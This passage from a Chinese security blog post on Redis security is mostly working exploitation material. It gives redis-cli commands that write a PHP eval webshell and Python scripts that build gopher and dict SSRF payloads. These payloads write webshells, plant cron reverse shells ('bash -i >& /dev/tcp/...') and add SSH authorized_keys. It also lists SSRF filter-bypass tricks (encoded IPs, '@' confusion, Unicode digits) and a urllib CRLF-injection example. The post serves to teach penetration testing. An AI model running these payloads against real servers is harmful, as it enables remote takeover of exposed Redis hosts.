+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename koishi.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure></div>
+
+<p>在ssrf的情况下，我们需要借助 gopher 协议帮助我们写马</p>
+<p>根据 RESP 协议编写的 python 脚本<code>redisSsrf.py</code>，将上述命令转换为 gopher payload。</p>
+<h4 id="脚本-gopher"><a href="#脚本-gopher" class="headerlink" title="脚本-gopher"></a>脚本-gopher</h4><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse <span class="keyword">as</span> parse</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;192.168.13.128&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line">shell = <span class="string">&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span></span><br><span class="line">filename = <span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path = <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">cmd = [<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">       <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">       <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">       <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">       <span class="string">&quot;save&quot;</span></span><br><span class="line">       ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>, <span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(parse.quote(payload))</span><br></pre></td></tr></table></figure></div>
+
+<p>结合 SSRF 时，需要再次进行 URL 编码，也就是二次 url 编码后的结果传入，这样才能写马</p>
+<h4 id="脚本-dict-定时任务"><a href="#脚本-dict-定时任务" class="headerlink" title="脚本-dict-定时任务"></a>脚本-dict-定时任务</h4><p>上面写过一次了，这里我再复制一次吧</p>
+<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.109/ssrf/base/curl_exec.php?url=&quot;</span>  <span class="comment"># 存在 ssrf 的 url</span></span><br><span class="line">target = <span class="string">&quot;dict://192.168.0.119:6379/&quot;</span>  <span class="comment"># redis 服务器地址</span></span><br><span class="line">cmds = [<span class="string">&#x27;set:mars:\\\\&quot;\\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\\n\\\\&quot;&#x27;</span>,  <span class="comment"># shell接收地址与端口号</span></span><br><span class="line">        <span class="string">&quot;config:set:dir:/etc/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;config:set:dbfilename:crontab&quot;</span>,</span><br><span class="line">        <span class="string">&quot;bgsave&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> cmds:</span><br><span class="line">    cmd_encoder = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> single_char <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="comment"># 先转为ASCII</span></span><br><span class="line">        cmd_encoder += <span class="built_in">hex</span>(<span class="built_in">ord</span>(single_char)).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    cmd_encoder = binascii.a2b_hex(cmd_encoder)</span><br><span class="line">    cmd_encoder = urllib.parse.quote(cmd_encoder, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = url + target + cmd_encoder</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="comment"># request = urllib.request.Request(payload)</span></span><br><span class="line">    <span class="comment"># response = urllib.request.urlopen(request).read()</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="脚本-gopher-定时任务"><a href="#脚本-gopher-定时任务" class="headerlink" title="脚本-gopher-定时任务"></a>脚本-gopher-定时任务</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;192.168.230.138&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line">reverse_ip = <span class="string">&quot;192.168.163.132&quot;</span></span><br><span class="line">reverse_port = <span class="string">&quot;2333&quot;</span></span><br><span class="line">cron = <span class="string">&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;</span> % (reverse_ip, reverse_port)</span><br><span class="line">filename = <span class="string">&quot;root&quot;</span></span><br><span class="line">path = <span class="string">&quot;/var/spool/cron&quot;</span></span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">cmd = [<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">       <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(cron.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">       <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">       <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">       <span class="string">&quot;save&quot;</span></span><br><span class="line">       ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>, <span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<h4 id="脚本-写ssh私钥"><a href="#脚本-写ssh私钥" class="headerlink" title="脚本-写ssh私钥"></a>脚本-写ssh私钥</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;192.168.230.138&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line">sshpublic_key = <span class="string">&quot;\n\nid_rsa.pub 里的内容\n\n&quot;</span></span><br><span class="line">filename = <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">path = <span class="string">&quot;/root/.ssh/&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">cmd = [<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">       <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(sshpublic_key.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">       <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">       <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">       <span class="string">&quot;save&quot;</span></span><br><span class="line">       ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>, <span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="SSRF-ip绕过"><a href="#SSRF-ip绕过" class="headerlink" title="SSRF ip绕过"></a>SSRF ip绕过</h3><h4 id="1-xip-io"><a href="#1-xip-io" class="headerlink" title="1. xip.io"></a>1. xip.io</h4><p>xip.io的原理很简单，就是个dns解析服务</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">        10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">    www.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line"> mysite.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br></pre></td></tr></table></figure></div>
+
+<p>类似这样的格式都解析为 10.0.0.1<br><a class="link"   target="_blank" rel="noopener" href="http://域名+地址+xip.io/" >http:&#x2F;&#x2F;域名+地址+xip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，将解析到对应地址。</p>
+<h4 id="2-本地回环地址的其他表现形式"><a href="#2-本地回环地址的其他表现形式" class="headerlink" title="2. 本地回环地址的其他表现形式"></a><strong>2. 本地回环地址的其他表现形式</strong></h4><p><strong>127.0.0.1</strong>，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加[])：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1</span><br><span class="line">http://localhost</span><br><span class="line">http://127.255.255.254</span><br><span class="line">127.0.0.1 - 127.255.255.254 之间</span><br><span class="line">http://[::1]</span><br><span class="line">http://[::ffff:7f00:1]</span><br><span class="line">http://[::ffff:127.0.0.1]</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]</span><br><span class="line">http://127.1</span><br><span class="line">http://127.0.1</span><br><span class="line">http://0:80</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="3-对ip进行进制转换"><a href="#3-对ip进行进制转换" class="headerlink" title="3. 对ip进行进制转换"></a>3. 对ip进行进制转换</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240121130241839.png"
+                      alt="image-20240121130241839"
+                ></p>
+<p>（十六进制也可以和十进制一样不用加 点）</p>
+<p>由于IP地址可以用多种格式表示，因此可以在URL中如下所示使用：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">点分十进制IP地址（正常形式）			http://127.0.0.1</span><br><span class="line">八进制IP地址					     http://0177.0000.0000.0001（将每个十进制数字转换为八进制）</span><br><span class="line">十六进制IP地址					http://0x7f000001 或者 http://0x7f.0x00.0x00.0x01（将每个十进制数字转换为十六进制）</span><br><span class="line">整数或DWORD IP地址                http://2130706433 (十进制)</span><br><span class="line">不同进制组合也是可以的              http://0177.0.0.0x01</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="4-添加一些url标志混淆"><a href="#4-添加一些url标志混淆" class="headerlink" title="4. 添加一些url标志混淆"></a>4. 添加一些url标志混淆</h4><p><strong>比如使用 “@” 符号绕过</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.10 http//10.10.10.10请求是相同的。</span><br></pre></td></tr></table></figure></div>
+
+<p>该请求得到的内容都是10.10.10.10的内容，此绕过同样在URL跳转绕过中适用。</p>
+<p>其他的还有</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com@127.0.0.1/</span><br><span class="line">http://a@127.0.0.1:80@baidu.com</span><br><span class="line">http://127.0.0.1/www.baidu.com/../../../../../etc/passwd</span><br><span class="line">http://127.0.0.1/?url=www.baidu.com</span><br><span class="line">http://127.0.0.1/#www.baidu.com</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="5-点分割符号替换（钓鱼邮件常用于绕过检测）"><a href="#5-点分割符号替换（钓鱼邮件常用于绕过检测）" class="headerlink" title="5. 点分割符号替换（钓鱼邮件常用于绕过检测）"></a><strong>5. 点分割符号替换（钓鱼邮件常用于绕过检测）</strong></h4><p>在浏览器中可以使用不同的分割符号来代替域名中的.分割，可以使用。、｡、．来代替：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www。qq。com</span><br><span class="line">http://www｡qq｡com</span><br><span class="line">http://www．qq．com</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="6-特殊数字绕过"><a href="#6-特殊数字绕过" class="headerlink" title="6. 特殊数字绕过"></a>6. 特殊数字绕过</h4><p>有时候可以用特殊数字来绕过，构造特殊的127.0.0.1，如圈或者unicode字符</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">①②⑦.⓪.⓪.①</span><br><span class="line">𝟏𝟐𝟕.𝟎.𝟎.𝟏</span><br><span class="line">𝟭𝟮𝟳.𝟬.𝟬.𝟭</span><br><span class="line">１２７.０.０.１</span><br></pre></td></tr></table></figure></div>
+
+<p>uncode字符</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗</span><br><span class="line">𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵</span><br><span class="line">０１２３４５６７８９</span><br><span class="line">𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻</span><br><span class="line">𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<h3 id="Python-urllib-CRLF注入打本地Redis服务"><a href="#Python-urllib-CRLF注入打本地Redis服务" class="headerlink" title="Python urllib CRLF注入打本地Redis服务"></a>Python urllib CRLF注入打本地Redis服务</h3><p>该漏洞的前提python版本为python3 &lt; 3.4.3 || python2 &lt; 2.7.9，现在的python已不存在该问题，漏洞太老了。</p>
+<p>如果目标站点使用了Python漏洞版本的urllib库，并且请求的url外部可控，那么就可能存在内网被探测的风险，如果本机或内网服务器中装有未授权访问漏洞的Redis，那么服务器就存在被getshell的风险。</p>
+<p>原理和组合SSRF漏洞完全一样，可以通过CRLF注入来利用Redis向Crontab写入反弹shell的定时任务。</p>
+<p>例子：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a</span><br></pre></td></tr></table></figure></div>
+
+<p>解码结果如下</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1</span><br><span class="line">set admin 123456</span><br><span class="line">save</span><br></pre></td></tr></table></figure></div>
+
+<p>写定时任务同之前的payload</p>
+<p>详情参考：<a class="link"   target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/106" >https://security.tencent.com/index.php/blog/msg/106 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> Redis 安全</li>
+        <li><strong>作者:</strong> Ko1sh1</li>
+        <li><strong>创建于
+                :</strong> 2023-10-02 19:25:48</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2024-05-30 21:52:42
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://ko1sh1.github.io/2023/10/02/blog_Redis安全/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Redis/">#Redis</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2023/12/25/blog_python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Python 原型链污染</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/05/20/blog_hessian2%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hessian2 反序列化</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div class="twikoo-container">
+        <script data-swup-reload-script
+                src='https://cdn.staticfile.org/twikoo/1.6.31/twikoo.all.min.js'
+        ></script>
+        <div id="twikoo-comment"></div>
+        <script data-swup-reload-script>
+            function loadTwikoo() {
+                twikoo.init({
+                    el: '#twikoo-comment',
+                    envId: 'https://ko1sh1-blog-comments.hf.space',
+                });
+            }
+
+            if ('true') {
+                const loadTwikooTimeout = setTimeout(() => {
+                    loadTwikoo();
+                    clearTimeout(loadTwikooTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadTwikoo);
+            }
+        </script>
+    </div>
+
+
+        
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">Redis 安全</div>
